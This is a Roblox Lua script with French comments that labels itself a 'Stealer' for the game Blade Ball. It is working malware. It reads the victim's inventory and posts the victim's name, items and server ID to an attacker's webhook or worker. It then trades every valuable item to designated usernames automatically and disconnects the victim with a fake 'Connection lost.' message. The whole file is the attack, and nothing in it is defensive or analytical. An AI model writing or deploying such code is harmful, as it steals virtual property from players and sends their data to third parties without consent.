-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // RECUPERATION DES GLOBALES
local auth_token = _G.AuthToken or "EBK-SS-A" 
local webhook_url = _G.webhook or ""
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local netModule = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

print("🚀 Stealer chargé pour : " .. plr.Name)

-- // FONCTION D'ENVOI (DEBUG VERSION)
local function sendToWorker(payload)
    payload["auth_token"] = auth_token
    local encoded = HttpService:JSONEncode(payload)
    
    -- On teste toutes les fonctions de requête possibles
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    
    if requestFunc then
        local success, result = pcall(function()
            return requestFunc({
                Url = webhook_url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                    ["Accept"] = "application/json"
                },
                Body = encoded
            })
        end)
        
        if success then
            print("✅ Worker contacté ! Status code : " .. tostring(result.StatusCode))
            if result.StatusCode == 500 then
                warn("❌ Le Worker a crash (Erreur 500). Vérifie DISCORD_WEBHOOK_URL dans Cloudflare.")
            elseif result.StatusCode == 401 then
                warn("❌ Token invalide (401). Ton token : " .. auth_token)
            end
        else
            warn("❌ Erreur de connexion au Worker : " .. tostring(result))
        end
    else
        warn("❌ Exécuteur non compatible (pas de fonction request found)")
    end
end

-- // SCAN INVENTAIRE (LOGIQUE BLADE BALL)
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function getRAP(cat, name)
    if not rapData[cat] then return 0 end
    for key, val in pairs(rapData[cat]) do
        if string.find(key, name) then return val end
    end
    return 0
end

local totalRAP = 0
for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    totalRAP = totalRAP + rap
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

-- // ENVOI DU MESSAGE INITIAL
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    
    local grouped = {}
    for _, item in ipairs(itemsToSend) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end
    local listText = ""
    for name, count in pairs(grouped) do
        listText = listText .. string.format("%s (x%d)\n", name, count)
    end

    local payload = {
        ["username"] = totalRAP >= 500 and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
        ["content"] = (ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🟢 New Victim Detected",
            ["color"] = totalRAP >= 500 and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total RAP:", value = "**" .. tostring(totalRAP) .. "**", inline = true},
                {name = "Items:", value = listText ~= "" and listText or "None", inline = false}
            }
        }}
    }
    
    sendToWorker(payload)

    -- // LOGIQUE DE TRADE
    local inTrade = false
    plr.PlayerGui.Trade:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = plr.PlayerGui.Trade.Enabled end)

    local function checkPlayer(p)
        if table.find(users, p.Name) then
            print("🎯 Cible détectée : " .. p.Name)
            task.spawn(function()
                while #itemsToSend > 0 do
                    netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(p)
                    task.wait(1)
                    if inTrade then
                        -- Envoi auto des items (batch de 100)
                        local currentBatch = {}
                        for i = 1, math.min(100, #itemsToSend) do
                            table.insert(currentBatch, table.remove(itemsToSend, 1))
                        end
                        for _, item in ipairs(currentBatch) do
                            netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                        end
                        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
                        task.wait(0.3)
                        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                        repeat task.wait(0.5) until not inTrade
                    end
                end
                plr:kick("Connection lost.")
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do checkPlayer(p) end
    Players.PlayerAdded:Connect(checkPlayer)
end
